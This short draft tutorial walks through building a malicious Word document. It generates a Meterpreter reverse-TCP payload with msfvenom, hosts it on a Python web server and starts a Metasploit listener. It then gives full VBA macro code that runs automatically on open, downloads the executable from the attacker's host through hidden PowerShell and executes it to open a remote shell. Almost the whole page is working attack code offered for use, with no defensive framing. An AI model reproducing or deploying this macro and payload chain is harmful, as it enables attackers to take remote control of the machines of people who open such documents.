---
title: "[02] VBS Macro Payload Execution"
date: 2026-10-26
authors:
  - Prasanna
draft: true
---

{{< meta >}}

#### STEP 1: Set up client machine
- In the attacker machine generate a payload as shown below
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe

#### SET UP PYTHON SERVER TO HOST THE PAYLOAD
$ python3 -m http.server
```
- Now start `MSF CONSOLE` and set up the listener
```bash
$ msfdb run
$ msf > use exploi/multi/handler
$ msf > set payload windows/x64/meterpreter/reverse_tcp
$ msf > set LHOST 192.168.10.10
$ msf > set LPORT 4444
$ msf > run 
```
#### STEP 2: Malicious VBS Script
- In MS Word, embed the malicious VBS script by choosing `View` and click on `Macros`
![](/docs/03_techniques/assets/Pasted_image_20261026152438.png)
- Next Create a macro called `MyMacro`
![](/docs/03_techniques/assets/Pasted_image_20261026152554.png)
- Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload.
![](/docs/03_techniques/assets/Pasted_image_20261026152635.png)

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.10.10/payload.exe', 'payload.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "payload.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

```

- Save the document as `Macro Enabled` and open the document to see the execution. 
![](/docs/03_techniques/assets/Pasted_image_20261026152824.png)
